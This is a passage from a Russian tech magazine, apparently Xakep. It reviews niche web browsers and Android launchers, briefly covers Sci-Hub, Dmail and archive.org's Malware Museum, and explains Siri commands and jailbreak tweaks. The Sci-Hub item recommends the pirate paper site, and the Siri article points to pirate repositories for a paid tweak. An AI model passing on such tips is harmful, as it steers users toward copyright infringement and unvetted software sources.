рационной системе. В Chrome, Firefox и Internet Explorer за годы разработки
вложены миллиарды долларов и бесчисленные человеко-часы. О конкуренции
с ними может думать только безумец. И тем не менее альтернативные браузе-
ры не исчезают. Что движет их создателями и пользователями?
CONKEROR





            Кто делает: создатель тайлового оконного менеджера Ratpoison Шоун Беттс
           Зачем: Беттс ненавидит мышь
            Особенность: интерфейс в стиле семидесятых
           Движок: Gecko
           Платформы: Windows, OS X, Linux

Браузер под названием Conkeror (не путать с Konqueror) придуман не для про-
стых людей. Понимание этого приходит, когда узнаешь, что у него нет готово-
го инсталлятора и об установке зависимостей и сборке исполняемого файла
из исходников придется заботиться самому. Бояться, впрочем, нечего — это
быстрый и почти безболезненный процесс. Бывает хуже: другой намеченный
для обзора экзотический браузер (Dillo — он предназначен для старых ком-
пьютеров) помешала собрать ошибка, до которой у разработчиков месяцами
не доходят руки.
   Готовое приложение всем своим видом демонстрирует, что сборка из ис-
ходников — самое приятное из того, что ждет его пользователей. Окно Conkeror
лишено меню, панели инструментов, адресной строки и не реагирует на соче-
тания клавиш, которые поддерживаются всеми прочими браузерами. Чтобы
использовать Conkeror, необходимо заучить систему команд, большинство
элементов которой позаимствовано у классического текстового редактора
Emacs.
  Слово «классический» — не преувеличение. 1976 год, когда появился
Emacs, по компьютерным меркам был не античностью, а, скорее, юрским пе-
риодом. Даже клавиатура, на которую рассчитан его интерфейс, полностью
отличалась от современных. Помимо знакомого нам Ctrl, на ней имелись кла-
виши Meta, Super, Hyper и три разновидности Shift, отличий между которыми,
наверное, не помнит даже Ричард Столлман. С тех пор изменилось все, кро-
ме Emacs: некоторые команды этого текстового редактора (а следовательно,
и команды Conkeror) по-прежнему требуют клавишу Meta.





   Без шуток — инструкция к Conkeror начинается с объяснения, что такое Meta
и где искать ее на компьютерах, которые выпущены в этом веке (ответ зависит
от операционной системы). Большинство операций, выполняемых браузером,
требует нажатия одного или нескольких сочетаний клавиш. Статусная строка
у нижнего края окна показывает, что было нажато, как среагировала програм-
ма, и, если надо, запрашивает дополнительную информацию. Например, чтобы
открыть в браузере определенный адрес, нужно нажать сочетание клавиш Ctrl
и x, а затем Ctrl и f. После этого статусная строка предложит ввести URL сайта.
   Чтобы перейти по ссылке, можно использовать не только мышь, но и клави-
атуру. При нажатии клавиши f браузер подсвечивает все ссылки на странице
желтым цветом и выводит у каждой крохотный номер. Теперь следует ввести
нужный номер и нажать «Ввод». Это не проще, чем клик мышью, но смысл за-
теи определенно был не в простоте. Shift и b — еще одно сочетание клавиш,
о существовании которого полезно помнить. Оно позволяет вернуться на про-
шлую страницу.
   Вместо вкладок у Conkeror «буферы» (этот термин тоже унаследован
у Emacs). Каждый раз, когда пользователь открывает новый URL по Ctrl-x Ctrl-f,
он открывает его в новом буфере. Если не убивать буферы сразу (Сtrl-x k), то
к исходу рабочего дня браузер будет скрывать десятки, а то и сотни невидимых
буферов. Очевидного способа посмотреть список буферов нет, но их можно
перебирать: для этого служит сочетание клавиш Meta-n. Прочие команды ищи
в инструкции Conkeror — это едва ли не единственный браузер, который вы-
нуждает прочитать инструкцию от начала до конца, и, возможно, не раз.
VIVALDI





            Кто делает: Йон фон Тэчнер и другие выходцы из Opera Software
           Зачем: недовольство направлением развития Opera
            Особенность: «незаконный» отпрыск Opera
           Движок: Blink
           Платформы: Windows, OS X, Linux

Непосредственным результатом катастрофического перевода Opera с соб-
ственного движка на WebKit стало появление двух новых «опер». Первая
по-прежнему называется Opera, но ничуть на нее не похожа. Другая унасле-
довала от подлинной «Оперы» самые важные черты и многих разработчиков,
но формально не связана с компанией Opera Software и не имеет права ис-
пользовать эту торговую марку. Этот браузер называется Vivaldi.
  Интерфейс Vivaldi полностью настраивается: панель с вкладками можно пе-
реставить наверх или разместить у правого или левого края, адресную строку
можно опустить вниз, а окно, если очень хочется, перекрасить в черный цвет.
Мышиные жесты работают так же, как прежде, да и боковая панель с заметка-
ми, менеджером закачек и закладками тоже на месте и почти не изменилась.
Недостает только встроенного почтового клиента, но это временно: его раз-
рабатывают.
   Есть и новшества: вкладки теперь можно группировать. Чтобы создать груп-
пу, нужно перетащить одну вкладку на другую. В результате останется только
одна, но с отметкой у верхнего края. Кликая по этой отметке, можно переклю-
чать страницы внутри группы. Кроме того, если подержать мышь над вклад-
кой группы, из нее выпадет меню с миниатюрами всех страниц — примерно
так работает переключение сгруппированных окон в панели задач Windows.
Минусов полно: группу почти невозможно отличить от обыкновенной вкладки,
а переключать страницы труднее, чем хотелось бы. Одним словом, идея ну-
ждается в доработке.
   Другое нововведение — так называемые быстрые команды. Нажатие F2 (в
OS X — Command-E) выводит текстовое поле, позволяющее отыскать по на-
званию команды в меню браузера, вкладки и закладки, ввести URL или отпра-
вить запрос в поисковик. Пользователя OS X эта возможность вряд ли впечат-
лит. Поиск по командам в меню и так встроен во все приложения этой системы,
а все остальное умеет Spotlight, у которого, к слову, разработчики быстрых
команд бесстыдно скопировали интерфейс. Тем не менее трудно отрицать,
что эта функция полезна. Другое дело, что ее было бы логичнее реализовать
на базе адресной строки. Тогда и отдельное сочетание клавиш не понадоби-
лось бы.
ICAB





            Кто делает: автор популярного браузера для Atari Александр Клаус
           Зачем: по инерции
            Особенность: живое ископаемое
           Движок: WebKit
           Платформа: OS X

Те, кто пользовался «маками» больше десяти лет назад, возможно, еще пом-
нят о существовании этого браузера. Одно время он занимал в экосистеме
Apple примерно то же место, которое в Windows досталось Opera. iCab был ма-
леньким самобытным браузером, который конкурировал с Netscape и Internet
Explorer за счет огромного количества дополнительных функций для продви-
нутых пользователей.
  На официальном сайте iCab до сих пор можно скачать версию, рассчитан-
ную на Mac OS 7.5 — систему, которой больше двадцати лет. При этом история
браузера уходит еще глубже. Он разработан на базе приложения Crystal Atari
Browser, предназначенного для компьютеров Atari.
   iCab дожил до наших дней не без потерь. Несколько лет назад его создатель
перестал поспевать за эволюцией веб-стандартов и решил отказаться от бра-
узерного движка собственной разработки. Теперь iCab базируется на WebKit.
Остальное, впрочем, на месте, и, если окажется, что где-то в глубине этого
браузера уцелел код, написанный еще для той, старой Mac OS, никто не уди-
вится. В отличие от Conkeror, всего лишь подражающего программе из других
времен, iCab не подражание и не новодел. Это настоящий реликт, и то, что он
уцелел, — без преувеличения чудо.





   Дополнительные функции для продвинутых пользователей, когда-то быв-
шие коньком iCab, сегодня вряд ли кого-то впечатлят, и уж тем более — продви-
нутых пользователей. Первая заметная особенность браузера — бездонное
меню Modules, которое позволяет пропустить страницу через один из не-
скольких десятков сервисов: от соцсетей и закладочных сервисов до валида-
тора W3C. Кроме того, есть модули, которые извлекают из текущей страницы
картинки или ссылки, изменяют контрастность, а один даже вызывает кальку-
лятор. Другая особенность — так называемые фильтры, с помощью которых
iCab вырезает из страниц рекламу и добавляет в YouTube ссылку на скачива-
ние видео. Вместе фильтры и модули в какой-то степени восполняют отсут-
ствие у iCab поддержки аддонов.
BRAVE





            Кто делает: бывший директор Mozilla Foundation Брендан Айк
           Зачем: инвесторы платят — нужно отрабатывать
            Особенность: режет рекламу и вставляет свою
           Движок: WebKit
           Платформы: Windows, OS X

Brave привлекает внимание по двум причинам. Во-первых, компанию, которая
его разрабатывает, основал Брендан Айк, создатель JavaScript и один из ве-
дущих разработчиков сначала Netscape, а затем Mozilla. Во-вторых, у этого
браузера, в отличие от Chrome, Firefox и Internet Explorer, есть бизнес-модель.
Айк сумел убедить инвесторов, что он знает, как зарабатывать на браузерах
деньги.
  С первого же взгляда ясно, что инвесторские миллионы не пропали зря.
Средства пошли на хорошего дизайнера интерфейсов. Результат налицо: бра-
узер выглядит и действует безупречно. Вот некоторые любопытные штрихи,
которые внесли разработчики Brave. При загрузке страницы адресная строка
демонстрирует потраченное время. Эта деталь добавлена не просто так. Бы-
строта загрузки страниц — одно из декларируемых преимуществ браузера,
а индикатор времени делает ее заметным для пользователя. После заверше-
ния загрузки адресная строка исчезает, а ее место занимает название стра-
ницы. Чтобы вернуть адресную строку, нужно подвести к ней курсор мыши.
Если же подержать его над одной из неактивных вкладок, браузер покажет
содержимое вкладки, не переключаясь на нее.
   Главное же, если верить официальному сайту Brave, преимущество нового
браузера заключается в том, что он заботится о безопасности и тайне частной
жизни пользователя. При помощи команд, сгруппированных в меню Bravery
(«Храбрость»), можно включить принудительное использование защищенного
соединения с сайтами, автоматическое удаление трекеров, запрет установки
чужих cookies и блокировку рекламы.
   Последний пункт — самый интересный и в то же время самый спорный.
Хотя Brave умеет и просто блокировать рекламу, по умолчанию он не блоки-
рует, а заменяет ее на рекламу, которую продает сам стартап. Именно в этом
и заключается его бизнес-модель. Создатели браузера уверяют, что реклама,
которую показывают они, не будет ни раздражать пользователей, ни собирать
информацию о них. И то и другое, несмотря на обещания разработчиков, вы-
зывает серьезные сомнения.
NETSURF





            Кто делает: энтузиасты полузабытой платформы RISC OS
           Зачем: если не они, то кто?
            Особенность: ни от кого не зависит, ни с чем не совместим
           Движок: самодельный
           Платформы: Atari OS, BeOS, OS X, RISC OS, Linux

Почти все альтернативные браузеры основаны на тех же движках, что и Chrome,
Firefox и Internet Explorer. Исключения крайне редки, и Netsurf наглядно демон-
стрирует почему.
   У этого браузера необычная история. Он был разработан для операцион-
ной системы RISC OS, о которой в наше время почти никто не знает. RISC OS
предназначалась для малоизвестных компьютеров с процессором ARM, кото-
рые выпускали в Великобритании в девяностые годы. Тех компьютеров давно
нет, но энтузиасты никак не успокоятся. Они устанавливают RISC OS на совре-
менные устройства (например, на Raspberry Pi) и продолжают сочинять для нее
софт. Именно так появился Netsurf.
  Проблема заключается в том, что полноценная поддержка современных
веб-стандартов выходит за пределы возможностей даже самых целеустрем-
ленных энтузиастов. Разработчики Netsurf девятый год обещают доделать
JavaScript — пока не получается. Что касается CSS, то он отчасти работает, отча-
сти нет. Результат выглядит трагически. Netsurf испытывает серьезные затруд-
нения при отображении большинства сайтов. Если повезет, проблемы огра-
ничатся разъехавшейся версткой. Если же сайт нуждается в JavaScript, пиши
пропало. Использовать этот браузер для повседневной работы нельзя.
PC ZONE





                                          Андрей Письменный
                                                    apismenny@gmail.com
       SCI-HUB
              sci-hub.io
 1





            Если ты когда-нибудь имел дело с научными публикациями, то наверняка
сталкивался с неприятной ситуацией: нужная работа есть в интернете, но за
скачивание просят заплатить ощутимую сумму. Солидные заведения на это,
быть может, и согласны, а вот личное любопытство в итоге приходится удов-
летворять цитатами и пересказами из публичных источников. Но, оказывается,
пираты тиражируют не только интеллектуальную (и не очень) собственность
Голливуда.
   Сайт Sci-Hub позволяет скачать практически любую научную работу. Всё, что
для этого нужно — ввести в поисковую строку ее идентификатор, ссылку на сайт,
где она размещена (к примеру, ACM) или просто ключевые слова. Нажимаешь
open, и готово — можно смотреть PDF в браузере или скачать для дальнейшего
вдумчивого чтения.
   Судя по цифре на заглавной странице, база Sci-Hub насчитывает уже бо-
лее 47 миллионов публикаций. Как они были получены, можно не гадать: их
скачивают скриптом из любых источников, к которым удается получить доступ.
   Создатель Sci-Hub Александра Элбакян недавно давала интервью сайту
Geektimes, где делилась взглядами на свободу распространения информации.
Догадаться об их сути ты, впрочем, можешь и сам. Издатели, конечно, имеют
совсем другое мнение на этот счет, и уже успели подать на Элбакян в суд.
   Разделяешь ты революционные настроения или нет, иметь в закладках
ссылку на Sci-Hub полезно. Кстати, можешь заодно добавить и вот эту обнов-
ляющуюся подборку статей по компьютерной тематике. Большинство из них,
правда, легко найти в открытом доступе через Google Scholar — ссылки на него
прилагаются.
       DMAIL — СЕРВИС ДЛЯ СОЗДАНИЯ
      САМОУНИЧТОЖАЮЩИХСЯ ПИСЕМ
             mail.delicious.com
 2





             Электронные письма обычно хранятся годами, и если компьютер или ак-
каунт от веб-почты адресата будут скомпрометированы, то может пострадать
и отправитель. В особо деликатных случаях этого можно избежать, прибегнув
к специальным техническим решениям. Dmail — одно из таких решений, со-
зданное командой разработчиков известного сервиса закладок Delicious.
  Идея Dmail заключается в том, чтобы дать возможность в любой момент
отозвать письмо или даже создать «самоуничтожающиеся» послание. Дости-
гается это следующим образом: сначала нужно установить плагин для Chrome
и разрешить ему доступ к своему аккаунту Gmail (другие сервисы и другие
браузеры разработчики обещают охватить позже), затем при создании пись-
ма указать, что оно должно быть отправлено через Dmail.
   Если у адресата тоже установлен Dmail, то он увидит обычное письмо, если
нет, то ему придет ссылка, по которой можно прочитать послание в браузере.
Отправитель в своей копии письма в любой момент может нажать кнопку Revoke,
и тогда вместо текста будет отображаться сообщение о том, что информация
более недоступна, причем как у получателя, так и у самого отправителя.
   Разработчики подчеркивают, что не хранят на своих серверах письма в не-
зашифрованном виде и что шифрование происходит на стороне браузерного
расширения. Однако ключ, необходимый для расшифровки, содержится в са-
мом письме, так что пользователям придется полагаться на обещание авто-
ров Dmail действительно уничтожать все данные.
   К сожалению, нам так и не удалось заставить письма самоуничтожаться.
Если при отправке задать уничтожение через час, тексты писем будут по-преж-
нему доступны и через час, и на следующий день. А вот кнопка Revoke рабо-
тает как положено. Остается списать эти странности на статус «беты». Кстати,
разработчики планируют в будущем ввести платные аккаунты с возможностью
шифровать вложения и добавить опцию запрета на перенаправление писем.
Остается надеяться, что к тому времени самоуничтожение всё же починят.
      МУЗЕЙ МАЛВАРИ НА ARCHIVE.ORG
             archive.org/details/malwaremuseum
 3





            Если ты ещё не успел заценить музей старых вирусов, который в февра-
ле открылся на сайте archive.org, то обязательно сходи посмотреть, как пестро
и весело раньше выглядела малварь. Главная фишка музея в том, что выстав-
ляются в нем не просто скриншоты и описания — вирусы запускаются прямо в
браузере благодаря эмулятору JSMESS.
  В коллекции на момент написания этой заметки 82 экспоната, но список по-
степенно пополняется — месяц назад их было втрое меньше. Автор подборки
— Микко Хиппонен, он давно коллекционирует вирусы, созданные в восьмиде-
сятые и девяностые годы. В те времена их написание не имело корыстных мо-
тивов, и показать пользователю зараженной машины веселую заставку было
в порядке вещей.
   Интересно, что Хиппонен модифицирует исходники и создает обезврежен-
ные версии: в них сохранена художественная составляющая, но нет вызовов
вредоносных функций. Правда, Хиппонен сам признает, что на archive.org мож-
но было бы запускать и полноценные «зубастые» версии. Вирусы для DOS точ-
но не попытаются вырваться из эмулятора, да и возможность скачать вирус
тридцатилетней давности вряд ли способна привести к эпидемии.
   «Музей малвари» — лишь одна из многочисленных подборок старого соф-
та, выставленного на archive.org. Эмулятор JSMESS поддерживает около 600
платформ — от ZX Spectrum или, скажем, Vectrex до Windows 3.11. Огромный про-
стор для археологических раскопок и ностальгии!
MOBILE




ВЫПУСК #17. ДОМАШНИЙ ЭКРАН
КАРМАННЫЙ                    Штатный интерфейс
                     операционной системы
                        Android за несколько
                       лет прошел большой
                          путь. Но, хотя огромномуСОФТ
                       количеству пользователей
                      вполне хватает того, что
                      предлагает стоковый
                      лаунчер Android, он
                      нравится далеко не
                       всем. Если ты как раз
                     раздумываешь, каких
                      удобств тебе не хватает
                       в управлении твоим
                     смартфоном, обрати
                     внимание на выбранные
                    нами варианты.
                  Action Launcher
             Платформа: Android 4.1+
              Цена: бесплатно / 300 рублей

ACTION LAUNCHER
Среди «классических» лаунчеров  Action
Launcher, наверное, самый инновацион-
ный. С виду это стандартный домашний
экран Android, однако в нем есть множество
очень интересных и необычных функций.
   Первая — выдвигаемая с левой сторо-
ны экрана панель запуска приложений. Ис-
кать и запускать приложения с ее помощью
гораздо удобнее, чем через классическое
меню. Вторая — концепция Cover вместо
папок. В один ярлык можно вложить не-
сколько других, тап по ярлыку откроет при-
ложение, свайп покажет остальные ярлыки.
Третья — Shutters, схожий механизм, по-
зволяющий таким же образом показывать
виджет приложения, так что он не будет
занимать место на экране, но останется
доступен в любой момент. Четвертая —
панель с правой стороны экрана. Ее мож-
но использовать как доступный в любое
время домашний экран, можно размещать
как иконки, так и виджеты. Пятая — полно-
стью настраиваемый виджет поиска, ко-
торый позволяет добавлять собственные приложения. Шестая — автоматиче-
ское генерирование цветовой темы лаунчера на основе установленных обоев
(выглядит действительно эффектно).
  Плюс ко всему стандартные возможности других сторонних лаунчеров,
включая выравнивание размера иконок, поддержку тем, возможность редак-
тирования любой иконки, жесты и много чего еще. Единственный недоста-
ток — за большую часть функций придется выложить 300 рублей, однако две
наиболее удобные функции — Cover и панель приложений — доступны и бес-
платно.
                Smart Launcher
             Платформа: Android 2.2+
              Цена: бесплатно / 130 рублей

SMART LAUNCHER
Основная  отличительная  черта  Smart
Launcher —  группировка  приложений
по категориям. Тут нет меню приложений
и идеи размещения иконок на рабочем
столе самим пользователем. Вместо это-
го все установленные приложения автома-
тически размещаются на рабочем столе,
но не так, как это сделано в iOS, а с ис-
пользованием категорий, перемещаться
между которыми можно с помощью бо-
ковой панели. Всего есть шесть катего-
рий: общение, интернет, игры, мультиме-
диа, чтение и заметки и системные. Smart
Launcher автоматически определяет, к ка-
кой категории относится каждое прило-
жение, с помощью эвристики и сравнения
с собственной онлайн-базой.
  Кроме того, Smart Launcher фактически
включает в себя еще и экран блокировки,
позволяющий запускать наиболее часто
используемые приложения. По умолчанию
он будет появляться после стандартного
локскрина Android, поэтому для удобства
тот лучше отключить либо отключить экран блокировки самого лаунчера.
   Также стоит отметить очень развитую систему настроек. Здесь можно на-
строить практически все: размер иконок и сетку, анимацию, темы и много чего
еще. Есть даже защита приложений паролем. Большинство функций доступны
в бесплатной версии, но, заплатив 130 рублей, можно получить доступ еще
к некоторым настройкам и функциям, включая возможность размещения вид-
жетов.
   Кстати, это практически идеальный лаунчер для разного рода HDMI-стиков
и приставок на базе Android.
                Yahoo Aviate Launcher
             Платформа: Android
              Цена: бесплатно

YAHOO AVIATE LAUNCHER
Aviate — это попытка создать лаунчер, ко-
торый сам бы подстраивался под пользо-
вателя. Логика его работы очень проста:
лаунчер будет изменять свое состояние
в зависимости от времени суток, местопо-
ложения и твоих предпочтений. Например,
утром он покажет тебе сводку погоды, ин-
формацию о загруженности на дорогах,
а также предложит запустить «утренние»
приложения, ридер новостей например.
На работе лаунчер покажет тебе «рабо-
чие» приложения, TODO-лист, календарь
и добавит на экран несколько функций,
таких, например, как быстрое включение
конференц-связи. В дороге ты получишь
информацию о пробках и карту маршру-
та, рядом с барами, ресторанами и мага-
зинами — отзывы из Foursquare. Другими
словами, Aviate — это нечто вроде спла-
ва Google Now и лаунчера с еще большим
уровнем автоматизации.
   Если же тебе необходимо запустить
произвольное приложение, то здесь есть
похожее на Smart Launcher меню прило-
жений с разбивкой по категориям, а также
стандартное меню с сортировкой по ал-
фавиту. При всем этом Aviate полностью
бесплатный.
                 Launcher Lab
             Платформа: Android 4.0+
              Цена: бесплатно

LAUNCHER LAB
А это один из самых кастомизируемых ла-
унчеров в маркете. Фишка приложения
в том, что вместо стандартной сетки ико-
нок на рабочих столах здесь использует-
ся полностью редактируемая сетка, в ко-
торую можно вставлять любые элементы,
включая изображения, виджеты, иконки,
вешать на них действия, разворачивать,
уменьшать, увеличивать, точно позицио-
нировать на экране, назначать эффекты
и многое другое. Говоря простыми сло-
вами, рабочий стол можно сделать таким,
каким ты захочешь.
  Кроме  того, доступен магазин тем,
в котором можно найти сотни самых раз-
нообразных рабочих столов, созданных
другими пользователями  (на скриншо-
те один из них), ну и, конечно же, загру-
жать свои творения. Кроме того, так же
как в iOS, здесь есть свой Spotlight (свайп
вниз) для поиска приложений и Control
Center (свайп вверх) — выдвигаемая сни-
зу панель быстрых настроек.
1111MOBILE
СВИДАНИЕ
С SIRI                              Михаил Филоненко
                                                                                   mfilonen2@gmail.comРАЗБИРАЕМСЯ
С КОМАНДАМИ
 SIRI И УЧИМ ЕЕ
НОВЫМ
Примерно год назад в голосовом ассистенте Siri появи-
лась поддержка русского языка, что открыло нам возмож-
ность управлять своим смартфоном в машине, при го-
товке пищи и в других случаях, когда заняты руки. В этой
статье мы рассмотрим, какие команды поддерживает Siri,
разберем несколько интересных вариантов ее использо-
вания и попробуем научить ее новым командам.


ВСТУПЛЕНИЕ

Как появилась Siri

Первоначальный вариант Siri появился еще в 2010 году как приложение от не-
зависимых разработчиков. Тогда программа была сильно ограничена по функ-
циональности. Кроме того, она была доступна только в американском App
Store. Apple купила разработчика приложения, значительно усовершенствова-
ла утилиту и представила ее в качестве основной отличительной особенности
iPhone 4s в 2011 году. Приблизительно тогда же одноименное приложение было
удалено из онлайн-магазина компании.



Сегодня практически все разработчики ОС создают и развивают програм-
мы — голосовые ассистенты, которые призваны облегчить пользователю экс-
плуатацию смартфона или планшета в самых разных ситуациях. Что же каса-
ется iOS, то на этой платформе есть все три основные утилиты для голосового
управления: Google Now, Apple Siri, Microsoft Cortana. И если первая и третья
программа — это приложения от сторонних разработчиков, сильно ограни-
ченные в своих возможностях из-за отсутствия интеграции с прошивкой, то
творение компании из Купертино является полнофункциональным решением
для iPhone и iPad в этой области.
   Начиная с iPhone 4s и iPad 3 Siri присутствует на всех яблочных устройствах,
то есть в 2016 году все актуальные устройства, кроме iPad 2, ее поддержива-
ют. Возможно, многие не так часто пользуются этим инструментом, а потому
в данной статье расскажем о его особенностях и о том, как наиболее продук-
тивно и быстро получать информацию при помощи Siri.
РАЗБИРАЕМСЯ С НАСТРОЙКАМИ
Настроек у Siri не так уж и много. Все они сосредоточены в подразделе «Siri»
раздела «Основные» нативной программы «Настройки». В частности, можно
выбрать:
•  возможность активировать утилиту при помощи фразы «Привет, Siri». На-
   стройка работает только при подключении к зарядке (кроме iPhone 6s и 6s
    Plus). Но если ты уже ведешь диалог с ассистентом, он будет реагировать
   на эту фразу;
•  язык. Рекомендуемые к установке варианты — английский (США) или рус-
   ский. Первый наиболее проработан, второй будет проще в использовании;
•  голос Siri. Для каждого языка есть две настройки: мужской или женский, ак-
   цент при произношении. Например, для английского есть британский, аме-
   риканский и австралийский варианты;
•  аудиоотзыв. Данная настройка очень важна. Если установить «Всегда», Siri
   будет сопровождать репликой практически каждое свое действие. Соот-
   ветственно, параметр «Никогда» полностью отключит голосовые подсказ-
   ки. Есть также третий вариант, позволяющий управлять включением звука
   при помощи стандартной общесистемной регулировки кнопками громко-
   сти или ползунком в центре управления.

ПОПУЛЯРНЫЕ СЦЕНАРИИ ИСПОЛЬЗОВАНИЯ
У Siri есть сотни, если не тысячи сценариев использования, однако по-насто-
ящему эффективными могут быть лишь единицы. Здесь приведены несколько
сценариев использования голосового помощника, когда он будет намного по-
лезнее, чем традиционный графический интерфейс.
  Начнем с простого — запуска приложений и функций. Допустим, в яркий
солнечный день ты вышел на улицу и не можешь ничего рассмотреть на экране
устройства. Тогда можно смело зажать кнопку «Домой» и произнести коман-
ду «Увеличь яркость экрана до максимума». Теперь дисплей аппарата быстро
станет читаемым и выполнить необходимые действия на iPhone не составит
труда. Таким же образом можно отключить или включить Bluetouth, Wi-Fi, ре-
жим «Не беспокоить».
   Если на устройстве установлено много программ, открыть необходимую
также можно при помощи голоса. При этом открыта может быть абсолютно
любая программа, установленная на устройстве. Не удалось с первого раза
правильно назвать английское имя программы? Запрос можно откорректиро-
вать, исправив неточность в команде. Для этого нажми кнопку ? в нижнем пра-
вом углу и выполни касание по команде, которая отображается сверху.
   Открывать можно не только приложения, но и их отдельные меню, напри-
мер настройки конкретной утилиты или любую вкладку в нативном приложении
«Часы». А вот папки или меню в сторонних программах открыть не получится.
   Хочешь написать новое сообщение, письмо или пост в социальных сетях?
Siri сможет помочь и в этом. Скажи «Создать новое письмо», а затем укажи
контакт, которому собираешься отправить сообщение. Важно, чтобы к записи
был прикреплен адрес электронной почты. Введи голосом тему и содержание
письма, а затем подтверди его отправление. Так же создаются заметки, напо-
минания, твиты и публикации Facebook.





Список возможных вопросов                 Регулирование яркости при помощи Siri

  Поможет Siri найти и справочную информацию. Например, можно узнать
погоду на завтра, уточнить, сколько будет два плюс два, или найти статью в Ви-
кипедии по требуемому запросу. Другая возможность — чтение текста. Можно
прочитать последнюю сделанную заметку или письмо.
  В возможностях Siri числится и распознавание проигрываемой музыки.
Просто спроси «Какая музыка играет?», и через несколько секунд прослуши-
вания и анализа Siri найдет ее в своей базе данных. Вероятность ошибок до-
статочно велика, однако популярные песни находятся без проблем.





Форма ввода письма                       Распознавание музыки

Скорее всего, создавать пароли с помощью Siri тебе не захочется, однако и эта
возможность здесь имеется. Благодаря интеграции с сервисом Wolfram|Alpha
достаточно просто ввести команду «Wolfram, password» и получить несколько
возможных вариантов вместе с подробной информацией. К сожалению, инте-
грации с русской версией Siri здесь нет.
Данные о пароле Wolfram|Alpha в форме ввода ответа Siri



Также можно узнать, какие самолеты в данный момент пролетают над опре-
деленным городом. Просто скажи «What airplanes are flying above me?» или по-
добную фразу и получишь информацию о названии авиарейса, высоте полета
самолета и об угле относительно земли.
   Как видишь, возможности нативного голосового помощника очень велики.
Можно позвонить кому-нибудь, проверить непрочитанные письма, запустить
прослушивание музыки в определенном жанре, проложить путь к конкретно-
му месту или найти какое-либо слово в заметках. Siri с легкостью справится
со всеми этими задачами.
  Еще одна часть голосового управления iOS — диктовка текста, которая ак-
тивируется при нажатии соответствующей кнопки на клавиатуре iOS в любой
программе. Количество поддерживаемых языков больше, чем в Siri. Можно
расставлять знаки пунктуации, цифры и спецсимволы, начать писать с новой
строки. Ниже приведен текст, полученный полностью при помощи голосового
ввода iOS.
  Можно добавлять смайлики, а также включить Caps Lock. Подробно, впро-
чем, функцию диктовки описывать нет нужды — список команд приведен
на сайте Apple. Большинство из них, если дикция позволяет, можно воспроиз-
вести и на iOS.

САМЫЕ НЕОБЫЧНЫЕ СПОСОБЫ ИСПОЛЬЗОВАНИЯ
«Человечность» Siri дает почву для большого количества шуток с участием го-
лосового ассистента. Немало остается и скрытых возможностей, заложенных
в эту утилиту. Как оказалось, при помощи Siri можно начертить любое изобра-
жение. Для этого в английском варианте помощника (в русской версии вос-
произвести не удалось) необходимо ввести команду «graph (название объекта)
curve».





Дельфин, нарисованный с помощью графиков   Siri тренируется в навыках Beatbox
Хочешь, чтобы Siri поделилась своими достижениями в жанре Beatbox? Просто
введи эту команду в английской версии помощника. Что из этого получается,
можешь посмотреть в видео.
   Вероятно, возможность удаленно открывать и закрывать двери или выклю-
чать свет через несколько лет станет обычной, но пока системы умного дома
все еще в диковинку. Apple HomeKit, появившаяся пару лет назад, интегриро-
вана именно с голосовым помощником. На специальной странице выложен
список команд для этой технологии, а производители уже выпускают аксессу-
ары с ее поддержкой.
   Как оказалось, Siri способна работать и в качестве генератора случайных
чисел. Можно попросить голосового помощника подбросить монету или ко-
сти, и он выдаст произвольное значение.

Тренируем Siri

Если Siri неправильно произносит имена из приложения «Контакты», эту про-
блему можно решить. Перейди в карточку контакта, нажми «Изменить», затем
«Добавить поле» в самом низу. Выбери опцию «Произношение фамилии». Да-
лее просто включи диктовку и произнеси правильный вариант. Именно его Siri
будет произносить впоследствии. Для того чтобы добавить новый вариант об-
ращения, следует в меню «Добавить поле» выбрать соответствующую опцию.
Сюда можно записать, к примеру, уменьшительное имя близкого тебе человека.
Использовать голосовой помощник от Apple можно не только при помощи
встроенного микрофона, но и через гарнитуру. Для этого достаточно зажать
центральную кнопку на ней и ввести требуемую команду.



ТВИКИ ДЛЯ РАСШИРЕНИЯ ФУНКЦИОНАЛЬНОСТИ
Как видишь, возможностей у Siri множество, но можно их
расширить еще больше. Для этого, конечно же, потребуется
jailbreak и установка нескольких твиков.
  В последних версиях iOS появилась возможность акти-
                                    WWWвировать Siri при помощи голоса. Однако эта функция мно-
гих не устроила, так как требует подключения к питанию.                                                                           Список команд
Твик UnTetheredHeySiri предлагает выход: он добавляет в на-       «Диктовки»
стройки голосового помощника меню, которое позволяет
                                                                              Реакция Siri
выбрать, активировать Siri всегда или только при зарядке                                                                              на просьбу сы-
аппарата. Для изменения настроек не требуется Respring       грать Beatbox
или перезагрузка устройства. Разумеется, время автоном-
ной работы при использовании этой программы сократит-
ся, а потому тем, кто ценит возможность долго не заряжать
iPhone, не рекомендуется ее устанавливать.
   Если ты по какой-то причине не можешь ввести коман-
ду голосом, но имеешь возможность набрать ее, можно    WWW
использовать твик SpotlightSiri. Эта программа без интер-
                                                                           Список команд
фейса и настроек поддерживает iOS 8 и iOS 9. Для ее ис-                                                                              HomeKit и другая
пользования открой Spotlight и введи Siri, а далее — не-      информация
обходимую команду. После нажатия Enter откроется окно      о технологии
голосового помощника. Такая возможность будет особенно                                                                                                       SpotlightSiri
полезна, если необходимо ввести команду на нескольких
языках, например когда встречаются англоязычные имена     UnTetheredHeySiri
и термины в русской Siri.





Параметры твика UnTetheredHeySiri           Твик Assistant+ представлен
                                          в виде iOS-приложения
  Полезнейший твик при использовании голосового помощника — Assistant+.
Данная утилита, существующая уже давно, позволяет связать команду Siri
с переключателем Activator или настроить кастомные команды и ответы. Важ-
но и то, что программа поддерживает плагины, которых в Cydia можно найти
немало. Например, Siria позволяет дополнить нативный голосовой ассистент
возможностью рассказать об установленных твиках. Assistant+ платный, но его
можно установить и из бесплатных пиратских репозиториев.

ЗАКЛЮЧЕНИЕ
Голосовой ассистент Siri очень многогранен. Он станет незаменимым помощ-
ником для каждого, кто по тем или иным причинам предпочитает голосовое
управление. Конечно, не все функции на данный момент доступны в русской
версии, а некоторые фишки конкурентов и вовсе отсутствуют. Тем не менее
Apple непрерывно работает над утилитой, снабжая ее уникальными возможно-
стями и закладывая бесчисленные «пасхалки», о которых порой узнают лишь
спустя месяцы или годы.
MOBILE





                                                                           Роман Ярыженко
                                                                                              rommanio@yandex.ruЗАЩИЩАЙ
И ВЛАСТВУЙОБЗОР VPN-СЕРВИСОВ
ДЛЯ ANDROID
В последнее время в Google Play появилось очень много VPN-при-
ложений. И неудивительно — с нынешней-то обстановкой в Сети.
То один сайт падет жертвой Роскомнадзора, то другой. Недавно
в Бразилии заблокировали WhatsApp, и там не только подскочила
популярность его конкурентов, но и вырос интерес к различным
